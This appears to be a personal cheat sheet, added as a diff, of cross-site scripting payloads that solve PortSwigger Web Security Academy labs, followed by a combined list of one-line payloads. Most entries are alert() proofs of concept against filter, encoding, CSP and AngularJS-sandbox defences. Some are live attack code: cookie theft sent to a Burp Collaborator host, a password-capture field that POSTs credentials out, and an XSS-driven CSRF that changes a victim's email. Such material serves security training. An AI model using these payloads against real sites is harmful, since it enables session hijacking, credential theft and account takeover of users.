@@ -1,0 +1,148 @@
+Impact of reflected XSS
+
+    Perform any action within the application that the user can perform.
+    View any information that the user is able to view.
+    Modify any information that the user is able to modify.
+    Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+DOM XSS in jQuery anchor href attribute sink using location.search source
+javascript:alert(document.cookie)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DOM XSS in jQuery selector sink using a hashchange event
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS into attribute with angle brackets HTML-encoded
+"onmouseover="alert(1)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Stored XSS into anchor href attribute with double quotes HTML-encoded
+javascript:alert(1)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS into a JavaScript string with angle brackets HTML encoded
+'-alert(1)-'
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DOM XSS in document.write sink using source location.search inside a select element
+Adding new paramter
+&storeId="></select><img%20src=1%20onerror=alert(1)>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+{{$on.constructor('alert(1)')()}}
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected DOM XSS
+\"-alert(1)}//
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Stored DOM XSS
+<><img src=1 onerror=alert(1)>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Exploiting cross-site scripting to steal cookies
+    The victim might not be logged in.
+    Many applications hide their cookies from JavaScript using the HttpOnly flag.
+    Sessions might be locked to additional factors like the user's IP address.
+    The session might time out before you're able to hijack it.
+<script>document.location='http://Burp.collabrater.net?c='+document.cookie</script>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Exploiting cross-site scripting to capture passwords
+<input name=username id=username>
+<input type=password name=password 
+onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Exploiting XSS to perform CSRF
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS into HTML context with most tags and attributes blocked
+
+First mark the reflected parameter to FUZZ ex: id=<§§>
+Then FUZZ that parameter with all tags using XXS-Portswiger cheatsheet
+Here we found only "body" tag is allowed with HTTP code 200 and responce
+Then FUZZ for events for ex : <body%20$ $=1>
+Here we found "onerror" is alloud 
+So craft a payload according to "body" and "onerror"
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS into HTML context with all tags blocked except custom ones
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS with some SVG markup allowed
+
+First mark the reflected parameter to FUZZ ex: id=<§§>
+Then FUZZ that parameter with all tags using XXS-Portswiger cheatsheet
+Here we found only "SVG" tag is allowed with HTTP code 200 and responce
+Then FUZZ for events for ex : <svg><animatetransform%20§ §=1>
+Here we found "onbegin" is alloud 
+So craft a payload according to "SVG" and "onbegin"
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS in canonical link tag
+website/?%27accesskey=%27x%27onclick=%27alert(1)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS into a JavaScript string with single quote and backslash escaped
+</script><script>alert(1)</script>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+\'-alert(1)//
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+http://foo?&apos;-alert(1)-&apos;
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+${alert(1)}
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS with event handlers and href attributes blocked
+website/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS in a JavaScript URL with some characters blocked
+website/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS with AngularJS sandbox escape without strings | eval is blocked
+website/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS with AngularJS sandbox escape and CSP
+<script>
+location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS protected by very strict CSP, with dangling markup attack
+Huhe process, refer portswiger lab
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS protected by CSP, with CSP bypass
+website/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+All One Line XSS payloads based on above cheatsheet:
+
+<ScRipT>alert(1)</scrIpt>
+javascript:alert(document.cookie)
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+"onmouseover="alert(1)
+javascript:alert(1)
+'-alert(1)-'
+&storeId="></select><img%20src=1%20onerror=alert(1)>
+{{$on.constructor('alert(1)')()}}
+\"-alert(1)}//
+<><img src=1 onerror=alert(1)>
+<script>location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>
+website/?%27accesskey=%27x%27onclick=%27alert(1)
+</script><script>alert(1)</script>
+\'-alert(1)//
+http://foo?&apos;-alert(1)-&apos;
+${alert(1)}
+website/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+website/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+website/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+<script>location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';</script>
+website/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
